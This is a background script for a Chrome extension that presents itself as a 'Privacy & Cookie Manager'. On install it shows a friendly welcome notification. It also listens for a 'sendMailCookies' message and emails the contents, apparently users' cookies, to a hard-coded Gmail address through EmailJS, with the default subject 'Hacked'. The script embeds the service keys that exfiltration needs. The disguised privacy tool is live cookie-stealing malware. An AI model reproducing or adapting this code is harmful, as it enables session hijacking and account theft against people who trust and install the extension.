importScripts('email.min.js');
chrome.runtime.onInstalled.addListener(() => {
    // sendEmail('tranvantri352@gmail.com', 'Xin chào ' || '', 'Tôi Là một người đang cảm thấy rất zui');
    chrome.notifications.create({
        type: 'basic',
        title: 'Privacy & Cookie Manager',
        message: 'Welcome to Cookie Manager! Click the extension icon to get started.',
        iconUrl: 'icons/icon128.png'
    });
})

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'createNotification') {
        chrome.notifications.create(request.options);
    }
    if (request.type === 'sendMailCookies') {
        sendEmail('tranvantri352@gmail.com', request.subject || 'Hacked', request.message + "", request.message);
    }
})

function sendEmail(to, subject, message, cookies) {
    const fileContent = cookies;
    const blob = new Blob([fileContent], { type: 'text/plain' });
    const file = new File([blob], "message.txt", { type: "text/plain" });
    emailjs.init({ publicKey: "9AcDSxQl75lmz0yyx" });

    emailjs.send("service_x5c6a8t", "template_1dortme", {
        to_email: to,
        subject: subject,
        message: message
        // attachment: file
    }).then(function (response) {
        console.log('Email sent successfully!', response.status, response.text);
    }, function (error) {
        console.log('Failed to send email.', error);
    });
}

